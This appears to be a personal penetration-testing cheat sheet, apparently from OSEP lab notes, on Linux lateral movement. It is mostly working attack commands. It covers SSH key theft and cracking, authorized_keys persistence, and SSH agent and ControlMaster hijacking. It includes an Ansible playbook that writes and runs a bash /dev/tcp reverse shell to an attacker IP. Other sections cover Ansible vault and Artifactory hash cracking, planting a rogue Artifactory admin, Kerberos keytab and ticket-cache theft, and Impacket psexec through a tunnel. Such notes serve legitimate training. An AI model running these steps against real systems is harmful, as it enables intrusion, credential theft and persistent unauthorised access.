# Linux Lateral Movement
## SSH 
### SSH key
```
find /home -name "id_rsa" 2>/dev/null 
find /home -name "*.key" 2>/dev/null # key file maybe need password
find /home -name "known_hosts" 2>/dev/null
find /home -name ".bash_history" 2>/dev/null
cat /etc/hosts
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```
### SSH Persistence
```
ssh-keygen
cat /home/osep/.ssh/id_rsa.pub
echo `cat id_rsa.pub` >> victim/.ssh/authorized_keys
ssh offsec@192.168.70.45
```
### SSH controlmaster
```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```
###  use to same connection from SSJ controlmaster
```
use to same connection from controlmaster

offsec@controller:~$ ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
Last login: Fri Jul 16 05:26:15 2021 from 192.168.70.45
offsec@linuxvictim:~$ exit
logout
Shared connection to linuxvictim closed.
```
###   SSH Hijacking SSH-Agent and SSH Agent Forwarding
Loacl -> Controler -> Victim
#### Loacl ~/.ssh/config
```
ForwardAgent yes
```
#### Local /etc/ssh/sshd_config
```
AllowAgentForwarding yes
```
#### Local User
```
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
eval `ssh-agent`
ssh-add
ssh offsec@controller
ssh offsec@linuxvictim (Forwarding)
```
#### Local Root
```
root@kali:~# ssh offsec@controller
offsec@controller:~$ ssh offsec@linuxvictim
offsec@linuxvictim:~$
```
#### Hijacking On Controler
```
pstree -p offsec | grep ssh
ssh(1708)
sshd(1694)---bash(1695)---sudo(1812)---su(1814)---bash(1815)-+-grep(1830)
sshd(1800)---bash(1801)---ssh(1811)

cat /proc/1695/environ
SSH_AUTH_SOCK=/tmp/ssh-uOf0EjVycr/agent.1694

SSH_AUTH_SOCK=/tmp/ssh-uOf0EjVycr/agent.1694 ssh-add -l
3072 SHA256:NCWZ12edj9GbCS+yili+DZZjNW0ypBH1HqU5UUiaJOM osep@osep (RSA)

SSH_AUTH_SOCK=/tmp/ssh-uOf0EjVycr/agent.1694 ssh offsec@linuxvictim (no password)
```
##  Ansible
```
cat /etc/ansible/hosts
...
[victims]
linuxvictim
```
### Ad-hoc Commands
```
ansibleadm@controller:~$ ansible victims -a "whoami"
...
linuxvictim | CHANGED | rc=0 >>
ansibleadm

...
ansibleadm@controller:~$ ansible victims -a "whoami" --become
...
linuxvictim | CHANGED | rc=0 >>
root
```
### Exploiting Playbooks for Ansible Credentials
test.yaml
```
$ANSIBLE_VAULT;1.1;AES256
39363631613935326235383232616639613231303638653761666165336131313965663033313232
3736626166356263323964366533656633313230323964300a323838373031393362316534343863
36623435623638373636626237333163336263623737383532663763613534313134643730643532
3132313130313534300a383762366333303666363165383962356335383662643765313832663238
3036
```

```
python3 /usr/share/john/ansible2john.py ./test.yml
test.yml:$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540 >> testhash.txt
```

```
hashcat testhash.txt --force --hash-type=16900 /usr/share/wordlists/rockyou.txt --show

$ansible$0*0*9661a952b5822af9a21068e7afae3a119ef0312276baf5bc29d6e3ef312029d0*87b6c306f61e89b5c586bd7e182f2806*28870193b1e448c6b45b68766bb731c3bcb77852f7ca54114d70d52121101540:spongebob
```

```
cat pw.txt
cat pw.txt | ansible-vault decrypt
```

#### Write authorized_keys with Ansible yaml file
```
---
- name: Get system info
  hosts: all
  become: yes
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
    - name: Create a directory if it does not exist
      file:
              path: /root/.ssh
              state: directory
              mode: '0700'
              owner: root
              group: root
    - name: Create authorized keys if it does not exist
      file:
              path: /root/.ssh/authorized_keys
              state: touch
              mode: '0600'
              owner: root
              group: root
    - name: Update keys
      lineinfile:
              path: /root/.ssh/authorized_keys
              line: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0cueBdDe4HCKNYzbajXrR9rBdWfzdZVmj8tvdCM4MRCVIfRmWAPoW1q2eQ2SgnxDC5YpiUVlaNDvvaM4eZ4C56C4sCHOsc+qQrLszayCN1IjDHIcRZjYb355qaIt1fIRhy6C1m+XuAVp9+kJQ+y42ub3TP562Sxnf2HR7swNIkilM2vXBUW5uE8zSLD7qmJPu/UTktnPrmZi04v0aKMudY39yigGrspjY2fXaF1hxWkq1o7CfBZT6sF5yTFBUUV/8vAhsNXf6dRg76gxhc3WPitX05dIkn/OdJwln44oYy+H4P+v/EkhjDEELYL05D6yw2zk1sxbiP5+z9sYPWQGSjPo4EqSA0DrN9Qa9km6H7NX8vHipfbwodrmVaVRd0VUWVdKXpzflhJqCklxJSBOBL9iLpWsz15ZyMRKXpk48KNpLTH+lGOZ4VUBX3e3+iSRgO5UpUsps4ZYLueaPcB5LXLSqEmrNudauzxp+bGD8nN7sCY5lOjnAJEtG0ND8T+0= osep@osep"
              insertbefore: EOF
```
#### ansible-playbook getshell
ansible-playbook getinfoshell.yaml
```
---
- name: Get system info
  hosts: all
  become: yes
  gather_facts: true
  tasks:
    - name: Display info
      debug:
          msg: "The hostname is {{ ansible_hostname }} and the OS is {{ ansible_distribution }}"
    - name: Creat reverse shell file
      file:
              path: /tmp/reverse.sh
              state: touch
              mode: '0600'
              owner: root
              group: root
    - name: write Reverse shell
      lineinfile:
              path: /tmp/reverse.sh
              line: "bash -i >& /dev/tcp/192.168.49.70/8080 0>&1"
              insertbefore: EOF
    - name: Execute Reverse shell
      command: bash /tmp/reverse.sh
```
## Artifactory 
### Artifactory Enumeration
`ps aux | grep artifactory`
### Compromising Artifactory Backups
`<ARTIFACTORY FOLDER>/var/backup/access`
`/opt/jfrog/artifactory/var/backup/access` list json file
```"username" : "developer",
    "firstName" : null,
    "lastName" : null,
    "email" : "developer@corp1.local",
    "realm" : "internal",
    "status" : "enabled",
    "lastLoginTime" : 0,
    "lastLoginIp" : null,
    "password" : "bcrypt$$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm",
    "allowedIps" : [ "*" ],
    "created" : 1591715957889,
    "modified" : 1591715957889,
    "failedLoginAttempts" : 0,
    "statusLastModified" : 1591715957889,
    "passwordLastModified" : 1591715957889,
    "customData" : {
      "updatable_profile" : {
        "value" : "true",
        "sensitive" : false
      }
    },
    "groups" : [ {
      "name" : "readers",
      "realm" : "internal"
    } ]
```
bcrypt hash content
```
$2a$08$f8KU00P7kdOfTYFUmes1/eoBs4E1GTqg4URs1rEceQv1V8vHs0OVm
```
crack hash
`john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt derbyhash.txt`
### Compromising Artifactory’s Database
database containing the user information
`/opt/jfrog/artifactory/var/data/access/derby`

```
mkdir /tmp/hackeddb
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck
```
connect database
```
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar
/opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
ij version 10.15
ij>connect 'jdbc:derby:/tmp/hackeddb/derby';
ij>elect * from access_users;
```
### Adding a Secondary Artifactory Admin Account
/opt/jfrog/artifactory/var/etc/access/bootstrap.creds
`haxmin@*=haxhaxhax`
`sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds`
`sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop`
`sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start`
`sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log`
`[a.s.b.AccessAdminBootstrap:160] [ocalhost-startStop-2] - [ACCESS BOOTSTRAP] Create admin user 'haxmin'`
## Kerberos on Linux

```
env | grep KRB5CCNAME
KRB5CCNAME=FILE:/tmp/krb5cc_607000500_3aeIA5
```
`kinit` list tickets currently stored in the user’s credential cache file
```
Valid starting Expires Service principal
05/18/2020 15:12:38 05/19/2020 01:12:38 krbtgt/CORP1.COM@CORP1.COM
renew until 05/25/2020 15:12:36
```
list of available Service Principal Names (SPN) from the domain controller
```
ldapsearch -Y GSSAPI -H ldap://dc01.corp1.com -
D "Administrator@CORP1.COM" -W -b "dc=corp1,dc=com" "servicePrincipalName=*"
servicePrincipalName
```
Getting a service ticket
```
administrator@corp1.com@linuxvictim:/tmp$ kvno MSSQLSvc/DC01.corp1.com:1433
MSSQLSvc/DC01.corp1.com:1433@CORP1.COM: kvno = 2
```
### Stealing Keytab Files
Keytab files contain a Kerberos principal name andm encrypted keys.
cat /etc/crontab
`ktutil`
`ktutil: addent -password -p administrator@CORP1.COM -k 1 -e rc4-hmac`
`ktutil: wkt /tmp/administrator.keytab`
#### use Keytab File access other server
`kinit administrator@CORP1.COM -k -t /tmp/administrator.keytab`
`klist`
`Valid starting Expires Service principal
07/30/2020 15:18:34 07/31/2020 01:18:34 krbtgt/CORP1.COM@CORP1.COM
renew until 08/06/2020 15:18:34`
#### renew
`kinit -R`
#### access other server
`smbclient -k -U "CORP1.COM\administrator" //DC01.CORP1.COM/C$`
#### Attacking Using Credential Cache Files
On Victim
`ls -al /tmp/krb5cc_*`
`sudo cp /tmp/krb5cc_607000500_3aeIA5 /tmp/krb5cc_minenow`
`sudo chown offsec:offsec /tmp/krb5cc_minenow`
`ls -al /tmp/krb5cc_minenow`
`kdestroy`
`klist`
`export KRB5CCNAME=/tmp/krb5cc_minenow`
`klist`
`kvno MSSQLSvc/DC01.corp1.com:1433`
`klist`
#### Using Kerberos with Impacket
On Attacker
`sudo apt install krb5-user`
`scp offsec@linuxvictim:/tmp/krb5cc_minenow /tmp/krb5cc_minenow`
`export KRB5CCNAME=/tmp/krb5cc_minen`
Tunnel
`ssh offsec@linuxvictim -D 9050`
Get Aduser
`proxychains python3 /usr/share/doc/python3-
impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.120.5
CORP1.COM/Administrator`
Get SPN
`proxychains python3 /usr/share/doc/python3-
impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.120.5
CORP1.COM/Administrator`
Get Ad Shell
`proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py
Administrator@DC01.CORP1.COM -k -no-pass`
